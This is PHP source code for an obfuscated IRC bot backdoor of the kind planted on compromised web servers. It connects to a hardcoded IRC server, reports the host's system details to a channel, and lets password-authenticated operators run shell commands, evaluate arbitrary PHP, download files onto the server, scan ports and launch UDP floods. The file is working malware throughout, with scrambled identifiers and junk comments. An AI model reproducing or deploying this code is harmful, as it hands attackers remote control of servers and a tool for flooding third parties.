<?php @set_time_limit(0); @error_reporting(0); class bTneEtKWqkzBTBTWe {

 var $KNHNwtwNHTKThBT = array("ZNWBhHwzQWZHwQBB"=>"gang.sexpil.net",
                     "Bnhq"=>"23232",
                     "KBKwh"=>"scary",
                     "BhbHKT"=>"13",
                     "HwQkEwH"=>"#wWw#",
                     "bkB"=>"scan",
                     "bTZTtztHH"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "HqhqNqQTqz"=>".",
                     "BkeZZnEwTHH"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $users = array(); 

 /* Z9JidSviYr6EshhzMFkSgczZdJVcSsaHsKPvsbEhsBLLITblpl4votls37uLpvjH5Z3o0yvjZ7V */
 function JasdDSPDdGJGspyYjpP() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "\0034ON\003"; }
    else { $safemode = "\0039OFF\003"; }

	$unme = php_uname();
	if($unme == "") { $mname = "\00315---\003"; }
	else { $mname = "\00315".$unme."\003"; }
		 
	 $url = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 $pth = "\00315".getcwd()."\003";
		  
	$pthh =  getcwd()."";
	$perms = fileperms("$pthh");

	if (($perms & 0xC000) == 0xC000) { $info = 's';
	} elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) { $info = '-';
	} elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
	} else { $info = 'u'; }

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));
			
	$rghts = "\00315".$info."\003";

	$this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"\00314[SAFE:\003\2 $safemode\2\00314]\00315 $url \00314[pwd:]\00315 $pth \00314(\003$rghts\00314) [uname:]\00315 $mname");
 }
 function PMVYVdmAYyj($to,$msg)
 {
    $this->pjdGysD("PRIVMSG $to :$msg");
 }
 function jdvsyMdg($host) 
 { 
    unset($this->users[$host]); 
 }
 function padSJmDJssyg($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 }
 function pjdGysD($msg) 
 { 
    fwrite($this->uiLlcOCLL,"$msg\r\n"); 
 }
function jjmDVmJVvvmyMA() 
 { 
    while(!feof($this->uiLlcOCLL)) 
    { 
       $this->buf = trim(fgets($this->uiLlcOCLL,512)); 
       $wHztzQTTzzzQE = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->pjdGysD("PONG :".substr($this->buf,6)); 
       } 
       if(isset($wHztzQTTzzzQE[1]) && $wHztzQTTzzzQE[1] =="004") 
       { 
          $this->pjdGysD("MODE ".$this->nick." ".$this->KNHNwtwNHTKThBT['']); 
          $this->pjdGysD("JOIN ".$this->KNHNwtwNHTKThBT['HwQkEwH']." ".$this->KNHNwtwNHTKThBT['bkB']."");
          $this->JgJYgP($this->KNHNwtwNHTKThBT['HwQkEwH'],$this->KNHNwtwNHTKThBT['bkB']);
          $this->JasdDSPDdGJGspyYjpP();
       } 
       if(isset($wHztzQTTzzzQE[1]) && $wHztzQTTzzzQE[1]=="433") 
       { 
          $this->pSvpYpajVJDmjJAD(); 
       } 
	/* FRZTt5leuVm22cTuJPGEDbThtLZnJgAeXqXhm9lGUxyNAi79YDDrEmzYXobxuCBiSpp4pBB9Y0N */
       if($this->buf != $old_buf) 
       { 
          $QBWEwkeWwhWwwB = array(); 
          $Ooi = substr(strstr($this->buf," :"),2); 
          $uLRR = explode(" ",$Ooi); 
          $frIXi = explode("!",$wHztzQTTzzzQE[0]); 
          $iuIUcu = explode("@",$frIXi[1]); 
          $iuIUcu = $iuIUcu[1]; 
          $frIXi = substr($frIXi[0],1); 
          $xUcRifO = $wHztzQTTzzzQE[0]; 
          if($uLRR[0]==$this->frIXi) 
          { 
           for($i=0;$i<count($uLRR);$i++) 
              $QBWEwkeWwhWwwB[$i] = $uLRR[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($uLRR);$i++) 
              $QBWEwkeWwhWwwB[$i] = $uLRR[$i]; 
          } 
          if(count($wHztzQTTzzzQE)>2) 
          { 
             switch($wHztzQTTzzzQE[1]) 
             { 
                case "QUIT": 
                   if($this->padSJmDJssyg($xUcRifO)) 
                   { 
                      $this->jdvsyMdg($xUcRifO); 
                   } 
                break; 
                case "PART": 
                   if($this->padSJmDJssyg($xUcRifO)) 
                   { 
                      $this->jdvsyMdg($xUcRifO); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->padSJmDJssyg($xUcRifO) && (md5($iuIUcu) == $this->KNHNwtwNHTKThBT['BkeZZnEwTHH'] || $this->KNHNwtwNHTKThBT['BkeZZnEwTHH'] == "*")) 
                   { 
                      if(substr($QBWEwkeWwhWwwB[0],0,1)==$this->KNHNwtwNHTKThBT['HqhqNqQTqz']) 
                      { 
                         switch(substr($QBWEwkeWwhWwwB[0],1)) 
                         { 
                            case "user": 
                              if(md5($QBWEwkeWwhWwwB[1])==$this->KNHNwtwNHTKThBT['bTZTtztHH']) 
                              { 
                                 $this->mvasJDpjP($xUcRifO);
                              } 
                              else 
                              { 
                                 $this->VVGgssJJAM($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2Auth\2]: Foute password $frIXi idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   } 
		     /* o8KoXeSeJ5ExSSzgd1IlKXAEd16cQWP5VqjIv2N4XhsG0RM3Jkfj8GObxKeewTaiajQvcuqZCIv */
                   elseif($this->padSJmDJssyg($xUcRifO)) 
                   { 
                      if(substr($QBWEwkeWwhWwwB[0],0,1)==$this->KNHNwtwNHTKThBT['HqhqNqQTqz']) 
                      { 
                         switch(substr($QBWEwkeWwhWwwB[0],1)) 
                         {
                            case "sexec":
                               $command = substr(strstr($Ooi,$QBWEwkeWwhWwwB[0]),strlen($QBWEwkeWwhWwwB[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"      : ".trim($ret[$i])); 
			    break;
                            case "logout": 
                               $this->jdvsyMdg($xUcRifO); 
                               $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[auth:]\00314 Je bent nu uitgelogt $frIXi"); 
			    break;
                            case "passthru": 
                               $command = substr(strstr($Ooi,$QBWEwkeWwhWwwB[0]),strlen($QBWEwkeWwhWwwB[0])+1); 

                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"      : ".trim($ret[$i])); 
			    break;
                            case "rndnick": 
                               $this->pSvpYpajVJDmjJAD(); 
			    break;
                            case "system": 
                               $command = substr(strstr($Ooi,$QBWEwkeWwhWwwB[0]),strlen($QBWEwkeWwhWwwB[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"      : ".trim($ret[$i])); 
			    break;
                            case "udpflood": 
                               if(count($QBWEwkeWwhWwwB)>3) 
                               { 
                                  $this->DPGVSSPAvdJgGpVyDm($QBWEwkeWwhWwwB[1],$QBWEwkeWwhWwwB[2],$QBWEwkeWwhWwwB[3]); 
                               } 
			    break;
                            case "eval":
                              $eval = eval(substr(strstr($Ooi,$QBWEwkeWwhWwwB[1]),strlen($QBWEwkeWwhWwwB[1])));
			    break;
                            case "restart": 
                               $this->pjdGysD("QUIT :gerestart door $frIXi");
                               fclose($this->uiLlcOCLL); 
                               $this->pmYjPgpYdPGdj(); 
			    break;
                            case "die": 
                               $this->pjdGysD("QUIT :die command from $frIXi");
                               fclose($this->uiLlcOCLL); 
                               exit;
                            case "exec": 
                               $command = substr(strstr($Ooi,$QBWEwkeWwhWwwB[0]),strlen($QBWEwkeWwhWwwB[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"      : ".trim($ret[$i])); 
			    break;
                            case "dns": 
                               if(isset($QBWEwkeWwhWwwB[1])) 
                               { 
                                  $ip = explode(".",$QBWEwkeWwhWwwB[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2dns\2]: ".$QBWEwkeWwhWwwB[1]." => ".gethostbyaddr($QBWEwkeWwhWwwB[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2dns\2]: ".$QBWEwkeWwhWwwB[1]." => ".gethostbyname($QBWEwkeWwhWwwB[1])); 
                                  } 
                               } 
			    break;
                            case "popen": 
                               if(isset($QBWEwkeWwhWwwB[1])) 
                               { 
                                  $command = substr(strstr($Ooi,$QBWEwkeWwhWwwB[0]),strlen($QBWEwkeWwhWwwB[0])+1); 
                                  $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  
			    break;
                            case "raw":
                               $this->pjdGysD(strstr($Ooi,$QBWEwkeWwhWwwB[1])); 
			    break;
                            case "info":
				   $this->JasdDSPDdGJGspyYjpP();
			    break;
                            case "download": 
                               if(count($QBWEwkeWwhWwwB) > 2) 
                               { 
                                  if(!$fp = fopen($QBWEwkeWwhWwwB[2],"w")) 
                                  {  
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[download:]\00314 Kon bestand niet downloaden. Toestemming geweigerd."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($QBWEwkeWwhWwwB[1])) 
                                     { 
                                        $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[download:]\00314 Kan bestand \2".$QBWEwkeWwhWwwB[1]."\2 niet downloaden."); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[download:]\00314 Bestand \2".$QBWEwkeWwhWwwB[1]."\2 gedownload naar \2".$QBWEwkeWwhWwwB[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               }
                               else { $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[download:]\00314 Typ \".download http://your.host/file /tmp/file\""); }
			    break;
                            case "pscan": 
                               if(count($QBWEwkeWwhWwwB) > 2) 
                               { 
                                  if(fsockopen($QBWEwkeWwhWwwB[1],$QBWEwkeWwhWwwB[2],$e,$s,15)) 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2pscan\2]: ".$QBWEwkeWwhWwwB[1].":".$QBWEwkeWwhWwwB[2]." is \2open\2"); 
                                  else 
                                     $this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2pscan\2]: ".$QBWEwkeWwhWwwB[1].":".$QBWEwkeWwhWwwB[2]." is \2closed\2"); 
                               } 
			    break;
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->pmYjPgpYdPGdj(); 
 }
 function VVGgssJJAM($to,$msg)
 {
    $this->pjdGysD("NOTICE $to :$msg");
 }
 function JgJYgP($chan,$key=NULL) 
 { 
    $this->pjdGysD("JOIN $chan $key"); 
 }
 function pSvpYpajVJDmjJAD() {
  $chars = 'abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789';	
  $size = strlen($chars);
  for($i=0;$i<$this->KNHNwtwNHTKThBT['BhbHKT'];$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  $this->pjdGysD("NICK ".$str."");
 }
 function MSmpjvdvAAMamSgAJ() {
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $size = strlen($chars);
  for($i=0;$i<6;$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  if(php_uname() == "") { $uname = "---"; } else { $uname = php_uname(); }
  $this->pjdGysD("USER ".$str."-w 127.0.0.1 localhost :".$uname."");
 }
 function DPGVSSPAvdJgGpVyDm($host,$packetsize,$time) {
	$this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->PMVYVdmAYyj($this->KNHNwtwNHTKThBT['HwQkEwH'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
 }
 function mvasJDpjP($host) 
 { 
    $this->users[$host] = true; 
 }
 function pmYjPgpYdPGdj() 
 { 
    if(!($this->uiLlcOCLL = fsockopen($this->KNHNwtwNHTKThBT['ZNWBhHwzQWZHwQBB'],$this->KNHNwtwNHTKThBT['Bnhq'],$e,$s,30))) 
    $this->pmYjPgpYdPGdj(); 
    $this->MSmpjvdvAAMamSgAJ();
    if(strlen($this->KNHNwtwNHTKThBT['KBKwh'])>0) 
    $this->pjdGysD("PASS ".$this->KNHNwtwNHTKThBT['KBKwh']);
    $this->pSvpYpajVJDmjJAD();
    $this->jjmDVmJVvvmyMA();
 }

 /* yRWJ68EsnYDFRA0tQmDoisiwjGStvQeTx1tu0XMdLgJtHAMnMfCUyKhHg01CG6l4XEpOs1R38rn */
}
$ClLUIlLX = new bTneEtKWqkzBTBTWe;
$ClLUIlLX->pmYjPgpYdPGdj(); ?>